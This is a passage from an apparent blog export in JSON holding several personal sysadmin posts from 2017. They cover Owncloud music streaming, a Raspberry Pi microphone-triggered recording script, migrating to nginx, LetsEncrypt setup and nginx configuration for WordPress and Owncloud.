href=\"http://www.subsonic.org/pages/index.jsp\">Subsonic</a>, which, to be fair, worked <em>excellently</em> out of the box. Unfortunately, <a href=\"http://www.subsonic.org/pages/premium.jsp\">after 30 days</a> you have to pay $1 a month, which I would have totally done if it weren’t for the fact that the source had been closed as of the most recent version. This was an effort to have an explicitly open-source solution, so that was no longer really an option.</p>\n<p>The next logical step was to try <a href=\"https://libresonic.org\">Libresonic</a>, a fork of the subsonic project from the point where the source was closed. Unfortunately, I was unable to successfully set up a working Libresonic server. At one point I had the interface working but there was no audio. The documentation was incomplete and there were no readily apparent support resources, so I thought I’d hit a dead end. I copied over some essentials from my library to my phone and sucked it up for awhile. It seems to be in active development though, so maybe I’ll look into it again later.</p>\n<p><a href=\"https://owncloud.org/\">Owncloud</a> actually had nothing to do with this search for a music streaming service. I decided to set that up just on a whim, for the obvious purpose of a cloud storage system. Setup was <em>much</em> easier than the last time I set up Owncloud a few years ago, you can read about that in <a href=\"https://tams.tech/blog/index.php/2017/01/24/all-kinds-of-fun-on-the-servers-lets-start-with-owncloud-part-1/\">part one</a>. At some point I read that Owncloud supported music streaming through the <a href=\"http://ampache.org/\">Ampache</a> protocol, which I’d heard about before. As soon as I had set up the base system I went straight into looking for that.</p>\n<p>Installation was a breeze. I just went to my Owncloud installation’s <em>apps</em><a href=\"https://github.com/owncloud/music/wiki/How-To-Install\">folder and cloned</a> the<a href=\"https://github.com/owncloud/music.wiki.git\"> git repository</a>, then opened up the web interface, clicked the drop-down on the top left, then the big “<strong>+ Apps</strong>” button. That took me to a list of available Owncloud applications, and at the bottom was the “Music” app – I simply clicked enable and it was there. Since I had already set up my music folder to be in my Owncloud database with Samba, so it simply scanned for info tags, and I was able to stream music right away.</p>\n<p>Now for the downside – Android. The <a href=\"https://f-droid.org/repository/browse/?fdfilter=owncloud&amp;fdid=com.owncloud.android\">Owncloud app</a> works nicely for file sharing, but the only app I was able to successfully connect to my server and sign in with was <a href=\"https://f-droid.org/repository/browse/?fdfilter=just+player&amp;fdid=jp.co.kayo.android.localplayer\"><em>Just Player</em></a> which is, to be blunt, ugly as fuck. So I’m still downloading my music to my phone, I just have a quick and easy way to do that now, even while I’m out. If you really have to stream your music to Android, Just Player works if you have the <a href=\"https://f-droid.org/repository/browse/?fdfilter=just+player&amp;fdid=jp.co.kayo.android.localplayer.ds.ampache\">Ampache plugin</a>.</p>\n</div>","amp":"70","plaintext":"I was subscribed to Google Play Music for about 3 or 4 years. I was an early\nadopter of it, and I got the family plan as soon as that came out as well. I\nalways said that it was the least I could do to support the artists I listen to.\nHowever, I began finding that the Google Play library didn’t include everything\nI wanted to listen to. Furthermore, it only allows streaming of lossy quality\naudio, and considering my recent push to more open-source solutions, it seemed\nlike the logical next step to have a locally-stored library at home that I could\nstream to my phone while I’m out.\n\nFirst, I tried Subsonic [http://www.subsonic.org/pages/index.jsp], which, to be\nfair, workedexcellently  out of the box. Unfortunately, after 30 days\n[http://www.subsonic.org/pages/premium.jsp]  you have to pay $1 a month, which I\nwould have totally done if it weren’t for the fact that the source had been\nclosed as of the most recent version. This was an effort to have an explicitly\nopen-source solution, so that was no longer really an option.\n\nThe next logical step was to try Libresonic [https://libresonic.org], a fork of\nthe subsonic project from the point where the source was closed. Unfortunately,\nI was unable to successfully set up a working Libresonic server. At one point I\nhad the interface working but there was no audio. The documentation was\nincomplete and there were no readily apparent support resources, so I thought\nI’d hit a dead end. I copied over some essentials from my library to my phone\nand sucked it up for awhile. It seems to be in active development though, so\nmaybe I’ll look into it again later.\n\nOwncloud [https://owncloud.org/]  actually had nothing to do with this search\nfor a music streaming service. I decided to set that up just on a whim, for the\nobvious purpose of a cloud storage system. Setup wasmuch  easier than the last\ntime I set up Owncloud a few years ago, you can read about that in part one\n[https://tams.tech/blog/index.php/2017/01/24/all-kinds-of-fun-on-the-servers-lets-start-with-owncloud-part-1/]\n. At some point I read that Owncloud supported music streaming through the \nAmpache [http://ampache.org/]  protocol, which I’d heard about before. As soon\nas I had set up the base system I went straight into looking for that.\n\nInstallation was a breeze. I just went to my Owncloud installation’sappsfolder\nand cloned [https://github.com/owncloud/music/wiki/How-To-Install]  the  git\nrepository [https://github.com/owncloud/music.wiki.git], then opened up the web\ninterface, clicked the drop-down on the top left, then the big “+ Apps” button.\nThat took me to a list of available Owncloud applications, and at the bottom was\nthe “Music” app – I simply clicked enable and it was there. Since I had already\nset up my music folder to be in my Owncloud database with Samba, so it simply\nscanned for info tags, and I was able to stream music right away.\n\nNow for the downside – Android. The Owncloud app\n[https://f-droid.org/repository/browse/?fdfilter=owncloud&fdid=com.owncloud.android] \n works nicely for file sharing, but the only app I was able to successfully\nconnect to my server and sign in with wasJust Player\n[https://f-droid.org/repository/browse/?fdfilter=just+player&fdid=jp.co.kayo.android.localplayer] \n which is, to be blunt, ugly as fuck. So I’m still downloading my music to my\nphone, I just have a quick and easy way to do that now, even while I’m out. If\nyou really have to stream your music to Android, Just Player works if you have\nthe Ampache plugin\n[https://f-droid.org/repository/browse/?fdfilter=just+player&fdid=jp.co.kayo.android.localplayer.ds.ampache]\n.","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-01-25T18:11:43.000Z","created_by":"1","updated_at":"2017-01-25T18:11:43.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133276e","uuid":"7a635bc1-df89-49be-aae2-7d7a163d70ac","title":"A bash script on the Raspberry Pi to automatically record audio when the microphone is connected.","slug":"a-bash-script-on-the-raspberry-pi-to-automatically-record-audio-when-the-microphone-is-connected","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nAs a part of my ongoing project at the Paper Theater, [End Her Laments](http://ehl.papertheater.co), I needed an easy way to record high-quality audio from our Yeti microphone to substitute the poor-quality microphone in my DSLR. I had the idea to use the Raspberry Pi that I initially got for a never-completed implementation of the as-yet-incomplete project [Jasper](https://jasperproject.github.io/) several days before I figured out how to actually solve the problem.\\n\\nI tossed around the idea of rigging up custom buttons  to the GPIO pins. While that would have worked, it would have been pretty difficult to actually do because I still haven’t had a chance to work with the GPIO system, so it would be a lot of experimentation in both software and hardware for something that I need to work reliably on set. One day it dawned on me to use the actual connectivity of the microphone as the record status.\\n\\nSo I wrote a simple bash script which loops and checks for the microphone, then either sleeps or starts recording. Thankfully, *arecord* is a brilliantly-written application, and can auto-name and segment my recordings, as well as cleanly stopping recording when the micropohone is unplugged, making this a very simple task. You can see my script below:\\n\\n#!/bin/bash LOOP=true MIC_KEYWORD=\\\"Yeti\\\" function record () { arecord --device=hw:CARD=Microphone -r 44100 -c 2 --format=S32_LE --max-file-time 60 --use-strftime %m-%d_testrec_%H:%M:%S.wav } while $LOOP; do DEVICE=$(arecord -l | grep \\\"$MIC_KEYWORD\\\"|sed \\\"s|:.*||\\\") if [ \\\"$DEVICE\\\" > \\\"/dev/null\\\" ] ; then record \\\"$DEVICE\\\" fi sleep 2 done;\\n\\nCheck out *man arecord* for more information on how exactly this works.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>As a part of my ongoing project at the Paper Theater, <a href=\"http://ehl.papertheater.co\">End Her Laments</a>, I needed an easy way to record high-quality audio from our Yeti microphone to substitute the poor-quality microphone in my DSLR. I had the idea to use the Raspberry Pi that I initially got for a never-completed implementation of the as-yet-incomplete project <a href=\"https://jasperproject.github.io/\">Jasper</a> several days before I figured out how to actually solve the problem.</p>\n<p>I tossed around the idea of rigging up custom buttons  to the GPIO pins. While that would have worked, it would have been pretty difficult to actually do because I still haven’t had a chance to work with the GPIO system, so it would be a lot of experimentation in both software and hardware for something that I need to work reliably on set. One day it dawned on me to use the actual connectivity of the microphone as the record status.</p>\n<p>So I wrote a simple bash script which loops and checks for the microphone, then either sleeps or starts recording. Thankfully, <em>arecord</em> is a brilliantly-written application, and can auto-name and segment my recordings, as well as cleanly stopping recording when the micropohone is unplugged, making this a very simple task. You can see my script below:</p>\n<h1 id=\"binbashlooptruemic_keywordyetifunctionrecordarecorddevicehwcardmicrophoner44100c2formats32_lemaxfiletime60usestrftimemd_testrec_hmswavwhileloopdodevicearecordlgrepmic_keywordsedsifdevicedevnullthenrecorddevicefisleep2done\">!/bin/bash LOOP=true MIC_KEYWORD=&quot;Yeti&quot; function record () { arecord --device=hw:CARD=Microphone -r 44100 -c 2 --format=S32_LE --max-file-time 60 --use-strftime %m-%d_testrec_%H:%M:%S.wav } while $LOOP; do DEVICE=$(arecord -l | grep &quot;$MIC_KEYWORD&quot;|sed &quot;s|:.*||&quot;) if [ &quot;$DEVICE&quot; &gt; &quot;/dev/null&quot; ] ; then record &quot;$DEVICE&quot; fi sleep 2 done;</h1>\n<p>Check out <em>man arecord</em> for more information on how exactly this works.</p>\n</div>","amp":"81","plaintext":"As a part of my ongoing project at the Paper Theater, End Her Laments\n[http://ehl.papertheater.co], I needed an easy way to record high-quality audio\nfrom our Yeti microphone to substitute the poor-quality microphone in my DSLR. I\nhad the idea to use the Raspberry Pi that I initially got for a never-completed\nimplementation of the as-yet-incomplete project Jasper\n[https://jasperproject.github.io/] several days before I figured out how to\nactually solve the problem.\n\nI tossed around the idea of rigging up custom buttons  to the GPIO pins. While\nthat would have worked, it would have been pretty difficult to actually do\nbecause I still haven’t had a chance to work with the GPIO system, so it would\nbe a lot of experimentation in both software and hardware for something that I\nneed to work reliably on set. One day it dawned on me to use the actual\nconnectivity of the microphone as the record status.\n\nSo I wrote a simple bash script which loops and checks for the microphone, then\neither sleeps or starts recording. Thankfully,arecord  is a brilliantly-written\napplication, and can auto-name and segment my recordings, as well as cleanly\nstopping recording when the micropohone is unplugged, making this a very simple\ntask. You can see my script below:\n\n!/bin/bash LOOP=true MIC_KEYWORD=\"Yeti\" function record () { arecord\n--device=hw:CARD=Microphone -r 44100 -c 2 --format=S32_LE --max-file-time 60\n--use-strftime %m-%d_testrec_%H:%M:%S.wav } while $LOOP; do DEVICE=$(arecord -l\n| grep \"$MIC_KEYWORD\"|sed \"s|:.*||\") if [ \"$DEVICE\" > \"/dev/null\" ] ; then\nrecord \"$DEVICE\" fi sleep 2 done;\nCheck outman arecord for more information on how exactly this works.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-01-26T01:09:35.000Z","created_by":"1","updated_at":"2017-01-26T01:09:35.000Z","updated_by":"1","published_at":"2017-01-26T01:09:35.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133276f","uuid":"742cb89b-42d4-4149-9ccc-e5276ced7d9b","title":"NginX is better than Apache.","slug":"nginx-is-better-than-apache","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI have spent the past week performing a migration of my three subsites (cloud, resume, and blog) from Apache on Ubuntu 16.04 to NginX on Debian Jessie. When I first set all this up, I was just trying to see if I could get it to work at all, so I placed the various sites in subdirectories of my document root (eg tams.tech/blog) instead of subdomains (like blog.tams.tech) which was how I wanted it all along anyway. Additionally, I have a second domain I needed to point at the same server ([The Paper Theater](https://papertheater.co)), and I couldn’t even get Apache to serve subdomains, let alone a whole other domain name. After 4 or 5 days of banging my head on the forums and blogs, and asking on freenode #sysadmin and #httpd channels, I decided Apache simply wasn’t going to do what I needed it to, and I was going to have to migrate to NginX. So I began with the long and tedious process of re-setting up mysql, php, all the dependencies, my wordpress and cloud mysql databases, getting new SSL certificates, and so on.\\n\\nBut at every step where Apache caused me frustration, NginX worked smoothly, and I’m a happy camper.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I have spent the past week performing a migration of my three subsites (cloud, resume, and blog) from Apache on Ubuntu 16.04 to NginX on Debian Jessie. When I first set all this up, I was just trying to see if I could get it to work at all, so I placed the various sites in subdirectories of my document root (eg tams.tech/blog) instead of subdomains (like blog.tams.tech) which was how I wanted it all along anyway. Additionally, I have a second domain I needed to point at the same server (<a href=\"https://papertheater.co\">The Paper Theater</a>), and I couldn’t even get Apache to serve subdomains, let alone a whole other domain name. After 4 or 5 days of banging my head on the forums and blogs, and asking on freenode #sysadmin and #httpd channels, I decided Apache simply wasn’t going to do what I needed it to, and I was going to have to migrate to NginX. So I began with the long and tedious process of re-setting up mysql, php, all the dependencies, my wordpress and cloud mysql databases, getting new SSL certificates, and so on.</p>\n<p>But at every step where Apache caused me frustration, NginX worked smoothly, and I’m a happy camper.</p>\n</div>","amp":"101","plaintext":"I have spent the past week performing a migration of my three subsites (cloud,\nresume, and blog) from Apache on Ubuntu 16.04 to NginX on Debian Jessie. When I\nfirst set all this up, I was just trying to see if I could get it to work at\nall, so I placed the various sites in subdirectories of my document root (eg\ntams.tech/blog) instead of subdomains (like blog.tams.tech) which was how I\nwanted it all along anyway. Additionally, I have a second domain I needed to\npoint at the same server (The Paper Theater [https://papertheater.co]), and I\ncouldn’t even get Apache to serve subdomains, let alone a whole other domain\nname. After 4 or 5 days of banging my head on the forums and blogs, and asking\non freenode #sysadmin and #httpd channels, I decided Apache simply wasn’t going\nto do what I needed it to, and I was going to have to migrate to NginX. So I\nbegan with the long and tedious process of re-setting up mysql, php, all the\ndependencies, my wordpress and cloud mysql databases, getting new SSL\ncertificates, and so on.\n\nBut at every step where Apache caused me frustration, NginX worked smoothly, and\nI’m a happy camper.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-03T06:24:48.000Z","created_by":"1","updated_at":"2017-02-03T06:24:48.000Z","updated_by":"1","published_at":"2017-02-03T06:24:48.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332770","uuid":"5a58eb8c-1310-4435-8ba9-6efd8b9d1b0d","title":"LetsEncrypt on LEMP is super-easy, but not really obvious.","slug":"letsencrypt-on-lemp-is-super-easy-but-not-really-obvious","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nYou’d think that installing LetsEncrypt on a webserver running nginx would be as simple as running letsencrypt –nginx. Not so! That doesn’t work!\\n\\nFirst, of course, you have to set up your domain name with your host. Then, you have to run\\n\\nsudo letsencrypt certonly --email admin@example.url -d example.url\\n\\nobviously replacing example.url with your URL. Then, add the following server block before your previously-set-up server block in sites-available.\\n\\nserver { listen 80; server_name example.url; return 301 https://example.url/$request_uri; }\\n\\nAfter that, you have to edit your existing server block by changing\\n\\nlisten 80;\\n\\nto\\n\\nlisten 443 ssl;\\n\\nand adding\\n\\n # SSL blob ssl_protocols TLSv1.1 TLSv1.2; # DO NOT ENABLE \\\"SSL\\\" PROTOCOL -- see CVE-2014-3566 ssl_certificate /etc/letsencrypt/live/example.url/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/example.url/privkey.pem;\\n\\nBut seriously, mad props to the people at LetsEncrypt, this is a super-simple, automated setup, and it’s free to boot!\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>You’d think that installing LetsEncrypt on a webserver running nginx would be as simple as running letsencrypt –nginx. Not so! That doesn’t work!</p>\n<p>First, of course, you have to set up your domain name with your host. Then, you have to run</p>\n<p>sudo letsencrypt certonly --email admin@example.url -d example.url</p>\n<p>obviously replacing example.url with your URL. Then, add the following server block before your previously-set-up server block in sites-available.</p>\n<p>server { listen 80; server_name example.url; return 301 <a href=\"https://example.url/$request_uri;\">https://example.url/$request_uri;</a> }</p>\n<p>After that, you have to edit your existing server block by changing</p>\n<p>listen 80;</p>\n<p>to</p>\n<p>listen 443 ssl;</p>\n<p>and adding</p>\n<h1 id=\"sslblobssl_protocolstlsv11tlsv12donotenablesslprotocolseecve20143566ssl_certificateetcletsencryptliveexampleurlfullchainpemssl_certificate_keyetcletsencryptliveexampleurlprivkeypem\">SSL blob ssl_protocols TLSv1.1 TLSv1.2; # DO NOT ENABLE &quot;SSL&quot; PROTOCOL -- see CVE-2014-3566 ssl_certificate /etc/letsencrypt/live/example.url/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/example.url/privkey.pem;</h1>\n<p>But seriously, mad props to the people at LetsEncrypt, this is a super-simple, automated setup, and it’s free to boot!</p>\n</div>","amp":"132","plaintext":"You’d think that installing LetsEncrypt on a webserver running nginx would be as\nsimple as running letsencrypt –nginx. Not so! That doesn’t work!\n\nFirst, of course, you have to set up your domain name with your host. Then, you\nhave to run\n\nsudo letsencrypt certonly --email admin@example.url -d example.url\n\nobviously replacing example.url with your URL. Then, add the following server\nblock before your previously-set-up server block in sites-available.\n\nserver { listen 80; server_name example.url; return 301 \nhttps://example.url/$request_uri;  }\n\nAfter that, you have to edit your existing server block by changing\n\nlisten 80;\n\nto\n\nlisten 443 ssl;\n\nand adding\n\nSSL blob ssl_protocols TLSv1.1 TLSv1.2; # DO NOT ENABLE \"SSL\" PROTOCOL -- see\nCVE-2014-3566 ssl_certificate /etc/letsencrypt/live/example.url/fullchain.pem;\nssl_certificate_key /etc/letsencrypt/live/example.url/privkey.pem;\nBut seriously, mad props to the people at LetsEncrypt, this is a super-simple,\nautomated setup, and it’s free to boot!","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-05T03:48:48.000Z","created_by":"1","updated_at":"2017-02-05T03:48:48.000Z","updated_by":"1","published_at":"2017-02-05T03:48:48.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332771","uuid":"05e880ef-b473-459d-afe3-78b4fb76bbb9","title":"Some important notes on setting up Wordpress with NginX","slug":"some-important-notes-on-setting-up-wordpress-with-nginx","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nFirst of all, I’d like to say that as has been my experience with nginx so far, setting up WordPress was easier than setting it up on Apache. However, some of the recommended configurations for the nginx configuration were lacking, and some were just bizarre. I want to post my findings so  that others don’t have to go through the same confusion.\\n\\nFirst of all, the NginX documentation recommends the following block at the beginning of your configuration:\\n\\n<span class=\\\"k\\\">upstream</span><span class=\\\"s\\\">php</span><span class=\\\"p\\\">{</span><span class=\\\"kn\\\">server</span><span class=\\\"s\\\">unix:/tmp/php-cgi.socket</span><span class=\\\"p\\\">;</span><span class=\\\"kn\\\">server</span><span class=\\\"n\\\">127.0.0.1</span><span class=\\\"p\\\">:</span><span class=\\\"mi\\\">9000</span><span class=\\\"p\\\">;</span><span class=\\\"p\\\">}</span>\\n\\nAnd in the server block for your WordPress site,\\n\\n<span class=\\\"kn\\\">fastcgi_pass</span><span class=\\\"s\\\">php</span><span class=\\\"p\\\">;</span>\\n\\nInstead, you should remove the entire “upstream” block, and replace the line that’s inside of your server block with\\n\\nfastcgi_pass unix:/var/run/php5-fpm.sock;\\n\\nassuming you have php5-fpm installed, and\\n\\nlisten = /var/run/php5-fpm.sock;\\n\\nset in your /etc/php5/fpm/pool.d/www.conf and\\n\\ncgi.fix_pathinfo = 0;\\n\\nset in your /etc/php5/fpm/php.ini. This tells WordPress to use php5-fpm instead of php5-cgi (which apparently nginx doesn’t support), and tells FPM to listen at a specific file instead of an open port. Considering my server is behind a NAT router, I’m not terribly concerned, but it’s better to take an obviously more secure setup when it seems appropriate. I got this idea from [this post on howtoforge](https://www.howtoforge.com/installing-nginx-with-php5-and-php-fpm-and-mysql-support-lemp-on-debian-wheezy) about setting up PHP on NginX.\\n\\n#### Also, it’s super important that you add this:\\n\\n client_max_body_size 2m;\\n\\nto your wordpress’s server block. Without that, you won’t be able to upload any media files over an arbitrarily low size somewhere between 17 and 180,000 bytes. I didn’t test it perfectly. So, a completely up-to-date NginX config for a WordPress installation with example.url as the domain name would probably look something like this:\\n\\nserver { listen 80; server_name example.url; return 301 https://example.url/$request_uri; } server { listen 443 ssl; server_name example.url; ssl_protocols TLSv1.1 TLSv1.2; ssl_certificate /etc/letsencrypt/live/example.url/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/example.url/privkey.pem; root /usr/share/nginx/html/example.url; access_log /var/log/nginx/access.log; index index.html index.php; client_max_body_size 2M; location = /favicon.ico{ log_not_found off; access_log off; } location = /robots.txt { allow all; log_not_found off; access_log off; } location /{ try_files $uri $uri/ /index.php?$args; } location ~ \\\\.php$ { include fastcgi.conf; fastcgi_intercept_errors on; fastcgi_pass unix:/var/run/php5-fpm.sock; } location ~* ~\\\\.(js|css|png|jpg|jpeg|gif|ico)$ { expires max; } }\\n\\nAlso note the super easy but not obvious[ letsencrypt configuration ](https://blog.tams.tech/posts/2017/02/letsencrypt-on-lemp-is-super-easy-but-not-really-obvious)in there.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>First of all, I’d like to say that as has been my experience with nginx so far, setting up WordPress was easier than setting it up on Apache. However, some of the recommended configurations for the nginx configuration were lacking, and some were just bizarre. I want to post my findings so  that others don’t have to go through the same confusion.</p>\n<p>First of all, the NginX documentation recommends the following block at the beginning of your configuration:</p>\n<p><span class=\"k\">upstream</span><span class=\"s\">php</span><span class=\"p\">{</span><span class=\"kn\">server</span><span class=\"s\">unix:/tmp/php-cgi.socket</span><span class=\"p\">;</span><span class=\"kn\">server</span><span class=\"n\">127.0.0.1</span><span class=\"p\">:</span><span class=\"mi\">9000</span><span class=\"p\">;</span><span class=\"p\">}</span></p>\n<p>And in the server block for your WordPress site,</p>\n<p><span class=\"kn\">fastcgi_pass</span><span class=\"s\">php</span><span class=\"p\">;</span></p>\n<p>Instead, you should remove the entire “upstream” block, and replace the line that’s inside of your server block with</p>\n<p>fastcgi_pass unix:/var/run/php5-fpm.sock;</p>\n<p>assuming you have php5-fpm installed, and</p>\n<p>listen = /var/run/php5-fpm.sock;</p>\n<p>set in your /etc/php5/fpm/pool.d/www.conf and</p>\n<p>cgi.fix_pathinfo = 0;</p>\n<p>set in your /etc/php5/fpm/php.ini. This tells WordPress to use php5-fpm instead of php5-cgi (which apparently nginx doesn’t support), and tells FPM to listen at a specific file instead of an open port. Considering my server is behind a NAT router, I’m not terribly concerned, but it’s better to take an obviously more secure setup when it seems appropriate. I got this idea from <a href=\"https://www.howtoforge.com/installing-nginx-with-php5-and-php-fpm-and-mysql-support-lemp-on-debian-wheezy\">this post on howtoforge</a> about setting up PHP on NginX.</p>\n<h4 id=\"alsoitssuperimportantthatyouaddthis\">Also, it’s super important that you add this:</h4>\n<p>client_max_body_size 2m;</p>\n<p>to your wordpress’s server block. Without that, you won’t be able to upload any media files over an arbitrarily low size somewhere between 17 and 180,000 bytes. I didn’t test it perfectly. So, a completely up-to-date NginX config for a WordPress installation with example.url as the domain name would probably look something like this:</p>\n<p>server { listen 80; server_name example.url; return 301 <a href=\"https://example.url/$request_uri;\">https://example.url/$request_uri;</a> } server { listen 443 ssl; server_name example.url; ssl_protocols TLSv1.1 TLSv1.2; ssl_certificate /etc/letsencrypt/live/example.url/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/example.url/privkey.pem; root /usr/share/nginx/html/example.url; access_log /var/log/nginx/access.log; index index.html index.php; client_max_body_size 2M; location = /favicon.ico{ log_not_found off; access_log off; } location = /robots.txt { allow all; log_not_found off; access_log off; } location /{ try_files $uri $uri/ /index.php?$args; } location ~ .php$ { include fastcgi.conf; fastcgi_intercept_errors on; fastcgi_pass unix:/var/run/php5-fpm.sock; } location ~* ~.(js|css|png|jpg|jpeg|gif|ico)$ { expires max; } }</p>\n<p>Also note the super easy but not obvious<a href=\"https://blog.tams.tech/posts/2017/02/letsencrypt-on-lemp-is-super-easy-but-not-really-obvious\"> letsencrypt configuration </a>in there.</p>\n</div>","amp":"130","plaintext":"First of all, I’d like to say that as has been my experience with nginx so far,\nsetting up WordPress was easier than setting it up on Apache. However, some of\nthe recommended configurations for the nginx configuration were lacking, and\nsome were just bizarre. I want to post my findings so  that others don’t have to\ngo through the same confusion.\n\nFirst of all, the NginX documentation recommends the following block at the\nbeginning of your configuration:\n\nupstreamphp{serverunix:/tmp/php-cgi.socket;server127.0.0.1:9000;}\n\nAnd in the server block for your WordPress site,\n\nfastcgi_passphp;\n\nInstead, you should remove the entire “upstream” block, and replace the line\nthat’s inside of your server block with\n\nfastcgi_pass unix:/var/run/php5-fpm.sock;\n\nassuming you have php5-fpm installed, and\n\nlisten = /var/run/php5-fpm.sock;\n\nset in your /etc/php5/fpm/pool.d/www.conf and\n\ncgi.fix_pathinfo = 0;\n\nset in your /etc/php5/fpm/php.ini. This tells WordPress to use php5-fpm instead\nof php5-cgi (which apparently nginx doesn’t support), and tells FPM to listen at\na specific file instead of an open port. Considering my server is behind a NAT\nrouter, I’m not terribly concerned, but it’s better to take an obviously more\nsecure setup when it seems appropriate. I got this idea from this post on\nhowtoforge\n[https://www.howtoforge.com/installing-nginx-with-php5-and-php-fpm-and-mysql-support-lemp-on-debian-wheezy]\n about setting up PHP on NginX.\n\nAlso, it’s super important that you add this:\nclient_max_body_size 2m;\n\nto your wordpress’s server block. Without that, you won’t be able to upload any\nmedia files over an arbitrarily low size somewhere between 17 and 180,000 bytes.\nI didn’t test it perfectly. So, a completely up-to-date NginX config for a\nWordPress installation with example.url as the domain name would probably look\nsomething like this:\n\nserver { listen 80; server_name example.url; return 301 \nhttps://example.url/$request_uri;  } server { listen 443 ssl; server_name\nexample.url; ssl_protocols TLSv1.1 TLSv1.2; ssl_certificate\n/etc/letsencrypt/live/example.url/fullchain.pem; ssl_certificate_key\n/etc/letsencrypt/live/example.url/privkey.pem; root\n/usr/share/nginx/html/example.url; access_log /var/log/nginx/access.log; index\nindex.html index.php; client_max_body_size 2M; location = /favicon.ico{\nlog_not_found off; access_log off; } location = /robots.txt { allow all;\nlog_not_found off; access_log off; } location /{ try_files $uri $uri/\n/index.php?$args; } location ~ .php$ { include fastcgi.conf;\nfastcgi_intercept_errors on; fastcgi_pass unix:/var/run/php5-fpm.sock; }\nlocation ~* ~.(js|css|png|jpg|jpeg|gif|ico)$ { expires max; } }\n\nAlso note the super easy but not obvious  letsencrypt configuration\n[https://blog.tams.tech/posts/2017/02/letsencrypt-on-lemp-is-super-easy-but-not-really-obvious]\nin there.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-05T03:49:55.000Z","created_by":"1","updated_at":"2017-02-05T03:49:55.000Z","updated_by":"1","published_at":"2017-02-05T03:49:55.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332772","uuid":"8dfdaa16-c6f8-4b96-8e1f-28c519c8d29b","title":"Some notes on Owncloud setup in NginX","slug":"some-notes-on-owncloud-setup-in-nginx","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nIn the official documentation for NginX, there are instructions for setting up Owncloud on NginX. Unfortunately, they haven’t been updated since Owncloud 5; we’re now on Owncloud 9. Needless to say, a few things have changed. Also, before beginning, go through[ this guide](https://www.howtoforge.com/installing-nginx-with-php5-and-php-fpm-and-mysql-support-lemp-on-debian-wheezy) to setup PHP-FPM on your server, and to properly secure it. Consider this an edit to [these](https://www.howtoforge.com/running-owncloud-5.0-on-nginx-lemp-on-debian-wheezy) instructions.\\n\\nFirst, follow steps 1 and 2 on the howtoforge link as it applies to you. You should change your webroot from /var/www/ to something else. If you followed the first guide to get php-fpm configured, you should have most of the packages in step 2 already installed. The most important part of that is setting\\n\\ncgi.fix_pathinfo=0\\n\\nWhen you get to step 3 of the second howtoforge link, that’s when the significant changes come. The download link is obviously super out of date. Get the latest one at the [owncloud download](https://owncloud.org/install/#edition) page. Then, I used a more intuitive MySQL setup, based on my recent experience with WordPress installations. Run “mysql -u root -p”, then enter your password. You will be at the standard MySQL prompt. Enter the following commands:\\n\\nCREATE DATABASE owncloud; CREATE USER 'OCadmin'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON owncloud.* TO 'OCadmin'@'localhost'; FLUSH PRIVILEGES; quit\\n\\nBe sure to change ‘password’ to a randomly generated, high-entropy password, as I talked about in my post on [password management](https://blog.tams.tech/2016/12/finally-getting-around-to-proper-password-management/). My terminal doesn’t seem to support high-ANSI characters, but anything else besides a single-quote is fair game with no backslash in that command, and there isn’t a length-limit that I know of, so your password can potentially be very high-entropy.\\n\\nFinally, there are some rather significant differences between today’s nginx configuration and the one recommended in the guide. The guide actually *caused* my owncloud to display improperly and not function correctly.\\n\\n- Exclude the ‘if’ statement. After reading 